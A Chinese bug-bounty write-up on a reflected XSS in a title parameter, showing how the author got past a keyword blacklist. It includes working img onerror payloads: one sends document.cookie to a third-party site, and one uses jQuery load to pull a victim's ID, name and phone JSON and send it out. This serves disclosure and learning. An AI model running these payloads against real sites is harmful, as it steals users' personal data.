前言：这是记录的前几天挖到的一个反射型xss漏洞，也是我在补天平台挖到的第一个专属src漏洞，详细的站点这里就不透露了，虽然目前查看了一下原漏洞已经被修补了。

1、挖掘的起点源于对某页面url中title参数的测试，该参数提交后被反射回来

```php
<span class="brand_left_txt1" id="city">title</span>
```

2、测试符号

站点未对&lt;&gt;;='"(){}进行过滤或者转义处理。（事实证明，我高兴早了~）

3、测试script标签

script被替换为了\[removed\]进行占位，尝试了大小写混杂，无效

4、其它标签

&lt;img src="<https://www.baidu.com/img/flexible/logo/pc/result.png>"&gt;

- 结果是ok的，在当前页面加载显示了百度的logo

5、尝试利用标签的属性和事件

这里有两个注意点：

1）如何触发事件

这里将src写为一个错误的地址，即可触发onerror事件

2）如何写事件

在这里，第一个难点是对alert、write等方法名进行了转换，转换为\[removed\]

然后转换思路，通过赋值的形式来利用js

6、尝试发送cookie到第三方站点

> 这里的第三方站点在测试时可以是任意的，而如果是实际攻击，替换为攻击者的站点即可

1）问题1：常规的转向行不通

网站对window、location等几个关键字也进行了替换，被替换为\[removed\]。

该问题的解决方案是不进行重定向，而是对img标签的this.src属性进行赋值

```html
<img src="错误的路径" onerror="this.src=第三方网站?cookie="+document.cookie>
```

当img的src为错误的路径，会触发onerror事件，在事件内为this.src属性赋值，该标签会重新进行请求，这样就将实现了将信息发送出去

2）问题2：关键cookie设置了httpOnly标志，无法通过js获取  
无法解决

7、提升利用价值

到这一步，在重重封锁下实现了对第三方站点发送信息，并且摸清了网站大致的保护思路。但是无法发送有效的cookie，基本没有利用价值。

在探索过程中，发现在登录后可以请求个人信息json，里面有身份证、姓名、手机号等等信息，并且潜在的可以请求头像、经历等信息。

利用思路：将个人信息发送到第三方站点，通过ajax请求信息，然后写到当前页面元素的内容中，再取出内容赋值给一个变量，最后将变量拼接到this.src属性中发送到第三方站点

问题：网站对function关键字也进行了转换，无法实现js的ajax

8、jquery

发现网站已经加载了jquery  
1）通过jquery的load方法请求个人信息json  
2）将json信息写入当前页面的某个元素的内容  
3）再获取该元素的内容赋值到变量中  
4）将变量拼接到this.src的路径中发送出去

```php
<img src="/img/b" onerror="$('footer').load('json请求接口');a=$('footer').html();this.src='第三方站点?info='+a">
```

8、后续

从网络监听来看，个人数据是被发送到第三方网站了的。但并不是很完美。

load方法是异步请求的json数据，因此变量a在前几次获取footer的内容时，并不能获取到json数据，this.src赋值相对于img标签来说仍然是一个坏的请求，所以会不断触发onrrer事件，在几次之后才能够发送真正需要的个人json数据。

该过程对于用户，即被攻击者来说，浏览器一直没有加载到想要的图片资源并且触发onerror，会不断刷新，容易引起察觉。

9、总结

该次渗透过程，算是一个非常大的突破。对于XSS漏洞的挖掘有了更深入的看法，同时也是对自我能力的肯定。

1）挖web漏洞，必须百分之两百的掌握html/js/jquery/ajax/json等前端知识，以及http协议。

2）思路非常重要，既要熟练掌握基本的挖掘思路，也要敢于去不断创新，大胆的猜。没有想象力就没有突破

3）坚持，不要放弃。本次测试，前后断断续续经历了大致3天的时间，不断想，不断学，不断测试，最后测试ok，进行了提交。

最后提一点，黑名单对XSS真的不行，最好还是进行转义处理